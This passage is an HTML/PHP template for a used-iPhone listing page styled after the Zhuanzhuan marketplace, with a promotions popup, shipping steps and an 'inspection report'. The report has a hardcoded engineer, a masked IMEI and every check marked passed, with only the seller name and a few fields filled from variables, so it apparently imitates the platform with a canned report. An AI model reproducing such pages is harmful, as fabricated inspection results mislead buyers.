                <span class="txt" data-v-0cdbc1bc="" data-v-f597be66="">iPhone8 Plus信用免押，租金9.9元/日起</span></li>
            </ul>
          </dd>
        </dl>
        <img onclick="cuxiao1()" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDU3LjEgKDgzMDg4KSAtIGh0dHBzOi8vc2tldGNoLmNvbSAtLT4KICAgIDx0aXRsZT7nrq3lpLQ8L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZyBpZD0i6aG16Z2iMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTE0LjI4ODU1MTksMTcuNDc2NzA0NyBDMTMuOTAwNDQwMSwxNy44Njk2MjY2IDEzLjkwNDMzOTQsMTguNTAyNzc5NiAxNC4yOTcyNjEzLDE4Ljg5MDg5MTQgQzE0LjY5MDE4MzMsMTkuMjc5MDAzMyAxNS4zMjMzMzYyLDE5LjI3NTEwMzkgMTUuNzExNDQ4MSwxOC44ODIxODIgTDIyLjc2MzY5NDIsMTEuNzQyNTMzNiBDMjMuMTUwMzU5MiwxMS4zNTEwNzY0IDIzLjE0ODEzOTksMTAuNzIwNzg4MiAyMi43NTg3Mjc4LDEwLjMzMjA2MzYgTDE1LjcwNjQ4MTcsMy4yOTIyNjg3MiBDMTUuMzE1NjEyNSwyLjkwMjA4OTY0IDE0LjY4MjQ0NzgsMi45MDI2NDkwOCAxNC4yOTIyNjg3LDMuMjkzNTE4MjcgQzEzLjkwMjA4OTYsMy42ODQzODc0NiAxMy45MDI2NDkxLDQuMzE3NTUyMTkgMTQuMjkzNTE4Myw0LjcwNzczMTI4IEwyMC42NDE3NTY1LDExLjA0NDc2MTMgTDE0LjI4ODU1MTksMTcuNDc2NzA0NyBaIiBpZD0i6Lev5b6EIiBmaWxsPSIjOTk5OTk5IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4KICAgIDwvZz4KPC9zdmc+" class="right-arrow" data-v-0cdbc1bc=""></div>
      <!---->
      <div data-v-f597be66="" id="cuxiao" class="z-popup-radius z-popup z-popup--bottom z-iphone-x" style="z-index: 2001;display: none;">
        <div data-v-5517391a="" data-v-f597be66="" class="common-btn-wrap">
          <div data-v-5517391a="" class="main">
            <div data-v-5517391a="" class="title">促销
              <i data-v-5517391a="" class="close z-icon z-icon-cross" onclick="close_icon()">
                <!----></i></div>
            <div data-v-5517391a="" class="container">
              <ul data-v-f597be66="" data-v-5517391a="" class="promotion-list-popup">
              	  
                <li data-v-f597be66="" data-v-5517391a="">
                	  <div data-v-f597be66="" data-v-5517391a="" class="tit">
                    <em data-v-f597be66="" data-v-5517391a="">赠品</em>
                    <span data-v-f597be66="" data-v-5517391a="">充电器套装</span></div>
                  <div data-v-f597be66="" data-v-5517391a="" class="desc">
                    <span data-v-f597be66="" data-v-5517391a=""></span>
                    <span data-v-f597be66="" data-v-5517391a=""></span>
                  </div>
                  <div data-v-f597be66="" data-v-5517391a="" class="tit">
                    <em data-v-f597be66="" data-v-5517391a="">3期免息</em>
                    <span data-v-f597be66="" data-v-5517391a="">发条分期×分期乐3期新用户免息</span></div>
                  <div data-v-f597be66="" data-v-5517391a="" class="desc">
                    <span data-v-f597be66="" data-v-5517391a=""></span>
                    <span data-v-f597be66="" data-v-5517391a=""></span>
                  </div>
                  <!----></li>
              </ul>
            </div>
            <div data-v-5517391a="" class="btn-wrap">
              <button data-v-5517391a="" class="btn">确定</button></div>
          </div>
        </div>
      </div>
      <div class="z-overlay" style="z-index: 2000; animation-duration: 0.3s; display: none;"></div>
    </section>
    <section class="express-and-select" data-v-12d613ae="">
      <div class="common-cell cell-info" data-v-0cdbc1bc="" data-v-12d613ae="">
        <dl data-v-0cdbc1bc="">
          <dt data-v-0cdbc1bc="">流程</dt>
          <dd data-v-0cdbc1bc="">
            <div class="main-wrap" data-v-06118f74="" data-v-12d613ae="" data-v-0cdbc1bc="">
              <div class="process" style="display: flex;" data-v-06118f74="">
                <div class="content" data-v-06118f74="">
                  <div class="circle-wrap" data-v-06118f74="">
                    <div class="circle first-circle" data-v-06118f74="">
                      <img src="picture/tb.png" alt="" data-v-06118f74=""></div>
                  </div>
                  <div class="text" data-v-06118f74="">
                    <?php echo $_GoodsID['user_name'];?>已发货</div></div>
                <div class="content" data-v-06118f74="">
                  <div class="circle-wrap line-wrap success" data-v-06118f74="">
                    <div class="circle" data-v-06118f74="">
                      <img src="picture/tb.png" alt="" data-v-06118f74=""></div>
                  </div>
                  <div class="text" data-v-06118f74="">平台已收货验机</div></div>
                <div class="content" data-v-06118f74="">
                  <div class="circle-wrap line-wrap success" data-v-06118f74="">
                    <div class="circle" data-v-06118f74="" style="    background-color: #e1dddd;">
                      <img src="picture/tb.png" alt="" data-v-06118f74="" style="display:none;"></div>
                  </div>
                  <div class="text" data-v-06118f74="">下单后24h发货</div></div>
              </div>
              <div class="baomai-router" data-v-06118f74="">
                <div class="first-circle circle" data-v-06118f74="" data-src="<?php echo $_GoodsID['goods_img1'] ?>" lazy="loaded" style="background-image: url(<?php echo $_GoodsID['goods_img1'] ?>); background-color: rgb(255, 255, 255); background-size: cover; background-position: center center;"></div>
                <span class="text" data-v-06118f74="">
                  <?php echo $_GoodsID['user_name'];?>的宝贝正通过平台保卖寄存在转转验机中心</span>
                <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDU3LjEgKDgzMDg4KSAtIGh0dHBzOi8vc2tldGNoLmNvbSAtLT4KICAgIDx0aXRsZT7nrq3lpLQ8L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZyBpZD0i6aG16Z2iMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTE0LjI4ODU1MTksMTcuNDc2NzA0NyBDMTMuOTAwNDQwMSwxNy44Njk2MjY2IDEzLjkwNDMzOTQsMTguNTAyNzc5NiAxNC4yOTcyNjEzLDE4Ljg5MDg5MTQgQzE0LjY5MDE4MzMsMTkuMjc5MDAzMyAxNS4zMjMzMzYyLDE5LjI3NTEwMzkgMTUuNzExNDQ4MSwxOC44ODIxODIgTDIyLjc2MzY5NDIsMTEuNzQyNTMzNiBDMjMuMTUwMzU5MiwxMS4zNTEwNzY0IDIzLjE0ODEzOTksMTAuNzIwNzg4MiAyMi43NTg3Mjc4LDEwLjMzMjA2MzYgTDE1LjcwNjQ4MTcsMy4yOTIyNjg3MiBDMTUuMzE1NjEyNSwyLjkwMjA4OTY0IDE0LjY4MjQ0NzgsMi45MDI2NDkwOCAxNC4yOTIyNjg3LDMuMjkzNTE4MjcgQzEzLjkwMjA4OTYsMy42ODQzODc0NiAxMy45MDI2NDkxLDQuMzE3NTUyMTkgMTQuMjkzNTE4Myw0LjcwNzczMTI4IEwyMC42NDE3NTY1LDExLjA0NDc2MTMgTDE0LjI4ODU1MTksMTcuNDc2NzA0NyBaIiBpZD0i6Lev5b6EIiBmaWxsPSIjOTk5OTk5IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4KICAgIDwvZz4KPC9zdmc+" class="right-arrow" data-v-06118f74=""></div>
            </div>
          </dd>
        </dl>
        <!----></div>
      <div class="common-cell cell-info" data-v-0cdbc1bc="" data-v-12d613ae="">
        <dl data-v-0cdbc1bc="">
          <dt data-v-0cdbc1bc="">售后</dt>
          <dd data-v-0cdbc1bc="">
            <div data-v-0cdbc1bc="" data-v-12d613ae="" style="    padding-top: 7px;">· 30天质保</div></dd>
        </dl>
        <img onclick="shouhou()" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDU3LjEgKDgzMDg4KSAtIGh0dHBzOi8vc2tldGNoLmNvbSAtLT4KICAgIDx0aXRsZT7nrq3lpLQ8L3RpdGxlPgogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+CiAgICA8ZyBpZD0i6aG16Z2iMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHBhdGggZD0iTTE0LjI4ODU1MTksMTcuNDc2NzA0NyBDMTMuOTAwNDQwMSwxNy44Njk2MjY2IDEzLjkwNDMzOTQsMTguNTAyNzc5NiAxNC4yOTcyNjEzLDE4Ljg5MDg5MTQgQzE0LjY5MDE4MzMsMTkuMjc5MDAzMyAxNS4zMjMzMzYyLDE5LjI3NTEwMzkgMTUuNzExNDQ4MSwxOC44ODIxODIgTDIyLjc2MzY5NDIsMTEuNzQyNTMzNiBDMjMuMTUwMzU5MiwxMS4zNTEwNzY0IDIzLjE0ODEzOTksMTAuNzIwNzg4MiAyMi43NTg3Mjc4LDEwLjMzMjA2MzYgTDE1LjcwNjQ4MTcsMy4yOTIyNjg3MiBDMTUuMzE1NjEyNSwyLjkwMjA4OTY0IDE0LjY4MjQ0NzgsMi45MDI2NDkwOCAxNC4yOTIyNjg3LDMuMjkzNTE4MjcgQzEzLjkwMjA4OTYsMy42ODQzODc0NiAxMy45MDI2NDkxLDQuMzE3NTUyMTkgMTQuMjkzNTE4Myw0LjcwNzczMTI4IEwyMC42NDE3NTY1LDExLjA0NDc2MTMgTDE0LjI4ODU1MTksMTcuNDc2NzA0NyBaIiBpZD0i6Lev5b6EIiBmaWxsPSIjOTk5OTk5IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4KICAgIDwvZz4KPC9zdmc+" class="right-arrow" data-v-0cdbc1bc=""></div>
      <div data-v-12d613ae="" id="shouhou" class="z-popup-radius z-popup z-popup--bottom z-iphone-x" style="z-index: 2003; display: none;">
        <div data-v-5517391a="" data-v-12d613ae="" class="common-btn-wrap">
          <div data-v-5517391a="" class="main">
            <div data-v-5517391a="" class="title">售后
              <i data-v-5517391a="" class="close z-icon z-icon-cross" onclick="close_icon()">
                <!----></i></div>
            <div data-v-5517391a="" class="container">
              <ul data-v-12d613ae="" data-v-5517391a="" class="aftersale-list">
                <li data-v-12d613ae="" data-v-5517391a="">
                  <p data-v-12d613ae="" data-v-5517391a="" class="tit">30天质保</p>
                  <p data-v-12d613ae="" data-v-5517391a="" class="desc">商品收货后可享受平台提供的30天免费质保维修服务（验机时已有的功能异常、外观问题、电池损耗及收货后人为损坏无法质保）</p></li>
              </ul>
            </div>
            <div data-v-5517391a="" class="btn-wrap">
              <button data-v-5517391a="" class="btn">确定</button></div>
          </div>
        </div>
      </div>
      <!---->

        </dl>
       </div>
      </section>
    <div class="header" id="goods" style="display:none;">
      <div class="services-box1">
        <div data-v-63e5e464="" class="sec-panel">
          <div data-v-63e5e464="" class="label1">服务</div>
          <div data-v-63e5e464="" class="service-wrap">
            <div data-v-63e5e464="" class="service-item">
              <img data-v-63e5e464="" src="picture/n_v2bc3464bbe21a4133924696afa6b03442.png">
              <!---->已验机</div>
            <div data-v-63e5e464="" class="service-item">
              <img data-v-63e5e464="" src="picture/n_v2bc3464bbe21a4133924696afa6b03442.png">
              <!---->
              <!---->24小时内发货</div>
            <div data-v-63e5e464="" class="service-item">
              <img data-v-63e5e464="" src="picture/n_v2bc3464bbe21a4133924696afa6b03442.png">
              <!---->
              <!---->30天质保</div>
            <!---->
            <div data-v-63e5e464="" class="service-item">
              <img data-v-63e5e464="" src="picture/n_v2bc3464bbe21a4133924696afa6b03442.png">
              <!---->
              <!---->7天无理由退货</div>
            <div data-v-63e5e464="" class="service-item">
              <img data-v-63e5e464="" src="picture/n_v2bc3464bbe21a4133924696afa6b03442.png">
              <!---->
              <!---->质检消毒</div></div>
          <div data-v-63e5e464="" class="arrow-right">
            <i class="icon-angle-right"></i>
          </div>
        </div>
      </div>
    </div>
    <section data-v-943883c8="" class="detail-main">
      <hr style="height:0.1px;border:none;border-top:0px solid #555555;" />
      <div data-v-41e57679="" data-v-943883c8="" class="report" id="report">
        <div data-v-516c4722="" data-v-41e57679="" class="report-wrap">
          <img data-v-204162c1="" src="picture/d73f0647-6868-4bdd-a1cb-fbe963772273.png" alt="" class="yx-sign">
          <div data-v-516c4722="" class="box">
            <div data-v-516c4722="" class="tt">验机评估报告</div>
            <div data-v-516c4722="" class="subtt">转转&amp;富士康联合制定验机标准</div>
            <div data-v-57f2b03f="" data-v-41e57679="" data-v-516c4722="">
              <div data-v-57f2b03f="" class="content detail">
                <div data-v-57f2b03f="" class="name">
                  <?php echo $_GoodsID['title']; ?></div>
                <div data-v-57f2b03f="" class="details">
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">成色</p>
                    <p data-v-57f2b03f="" class="detail-item-value"><?php echo $oldnew888;?></p></div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">电池健康值</p>
                    <p data-v-57f2b03f="" class="detail-item-value"><?php echo $oldnewa88;?></p></div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">电池情况</p>
                    <p data-v-57f2b03f="" class="detail-item-value"><?php echo $oldnewb888;?></p></div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">网络制式</p>
                    <p data-v-57f2b03f="" class="detail-item-value">
                      <?php echo $oldnewb888;?></p>
                  </div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">购买渠道</p>
                    <p data-v-57f2b03f="" class="detail-item-value">
                      国行</p>
                  </div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">官方保修</p>
                    <p data-v-57f2b03f="" class="detail-item-value">
                      已过保修期</p>
                  </div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">系统版本</p>
                    <p data-v-57f2b03f="" class="detail-item-value">
                      <?php echo $_GoodsID['att_color']; ?></p>
                  </div>
                  <div data-v-57f2b03f="" class="detail-item">
                    <p data-v-57f2b03f="" class="detail-item-key">IMEI</p>
                    <p data-v-57f2b03f="" class="detail-item-value">
                      357*******190</p>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-41e57679="" data-v-516c4722="" class="qc-result">
              <div data-v-42a5a67e="" data-v-41e57679="" class="qc-engineer-wrap" data-v-516c4722="">
                <div data-v-42a5a67e="" class="avatar" data-src="/images/yjs.png" lazy="loading" style="background-image: url(images/yjs.png&quot;);"></div>
                <div data-v-42a5a67e="" class="con">
                  <p data-v-42a5a67e="">
                    <span data-v-42a5a67e="" class="name">DongY.C</span>
                    <span data-v-42a5a67e="" class="level">验机工程师</span></p>
                  <p data-v-42a5a67e="" class="desc">
                    <span data-v-42a5a67e="">北京质检中心</span>
                    <span data-v-42a5a67e="">已检测11214件</span>
                    <span data-v-42a5a67e="">满意率100%</span></p>
                </div>
              </div>
              <div data-v-41e57679="" data-v-516c4722="" class="qc-engineer-desc">
                <div data-v-41e57679="" data-v-516c4722="" class="qc-engineer-desc-top">
                  <span data-v-41e57679="" data-v-516c4722="" class="qc-engineer-desc-title">检测结果</span>
                  <span data-v-41e57679="" data-v-516c4722="" class="qc-engineer-desc-time">
                    1</span>
                </div>
                <div data-v-41e57679="" data-v-516c4722="" class="qc-engineer-desc-bottom">经检测：该机外观请参考真机实拍图，检测结果详见验机报告。 同时转转提供7天无理由退货，平台质保服务。
</div></div>
              <div data-v-41e57679="" data-v-516c4722="" class="qc-list">
                <div data-v-0333544c="" data-v-41e57679="" class="qc-report-tab" data-v-516c4722="">
                  <div data-v-0333544c="" class="qc-title">
                    <div data-v-0333544c="" class="tt">
                      <span data-v-0333544c="" class="n">外观成色</span></div>
                    <div data-v-0333544c="" class="flex-con">
                      <div data-v-0333544c="" class="status">9.9
                        <i data-v-0333544c="" class="iconfont icon-checked"></i></div>
                      <i data-v-0333544c="" class="iconfont icon-angle-right icon-r arrow-down"></i>
                    </div>
                  </div>
                  <div data-v-0333544c="" class="qc-report-container" style="display: none;">
                    <div data-v-0333544c="" class="condition-wrap">
                      <div data-v-0333544c="" class="condition-desc">
                        </div>
                      <div data-v-0333544c="" class="pics-wrap">
                        <div data-v-0333544c="" class="pic-list">
                          <div data-v-0333544c="" class="pic-item" data-src="" lazy="loading" style="background-image: url(images/162601952149353.jpg&quot;);"></div>
                          <div data-v-0333544c="" class="pic-item" data-src="" lazy="loading" style="background-image: url(images/162601952369349.jpg&quot;);"></div>
                          <div data-v-0333544c="" class="pic-item" data-src="" lazy="loading" style="background-image: url(images/162601952588954.jpg&quot;);"></div>
                          <div data-v-0333544c="" class="pic-item" data-src="" lazy="loading" style="background-image: url(images/162601952775120.jpg&quot;);"></div>
                          <div data-v-0333544c="" class="pic-item" data-src="" lazy="loading" style="background-image: url(images/162601952149353.jpg&quot;);"></div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div data-v-0333544c="" data-v-41e57679="" class="qc-report-tab" data-v-516c4722="">
                  <div data-v-0333544c="" class="qc-title">
                    <div data-v-0333544c="" class="tt">
                      <span data-v-0333544c="" class="n">设备功能</span></div>
                    <div data-v-0333544c="" class="flex-con">
                      <div data-v-0333544c="" class="status">34项全通过
                        <i data-v-0333544c="" class="iconfont icon-checked"></i></div>
                      <i data-v-0333544c="" class="iconfont icon-angle-right icon-r arrow-down"></i>
                    </div>
                  </div>
                  <div data-v-0333544c="" class="qc-report-container" style="display: none;">
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">卡槽</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">卡槽外观</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">屏幕异物</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">进灰</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">气泡</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">屏幕色差</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">亮点坏点</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">红屏</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">老化发黄</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">屏幕显示</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">显示异常</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">触控</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">屏幕触控</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">按键功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">电源键</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">音量增键</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">音量减键</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">生物识别解锁</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">指纹识别</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">面部识别</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">感应器</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">重力感应</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">指南针</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">距离感应</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">光线感应</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">接口功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">耳机接口</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">数据接口</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">无线功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">WIFI</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">蓝牙</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">振动功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">振动功能</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">声音功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">扬声器</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">麦克风</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">听筒</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">电池功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">电池充电</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">SIM卡功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">卡1</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">卡2</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">扩展储存卡</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">储存卡识别</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">摄像功能</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">前置摄像头</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">后置摄像头</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">闪光灯</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">功能正常</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">设备系统</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">系统</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无越狱/无Root</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">ID锁</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">ID锁</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无</span></div>
                      </dd>
                    </dl>
                  </div>
                </div>
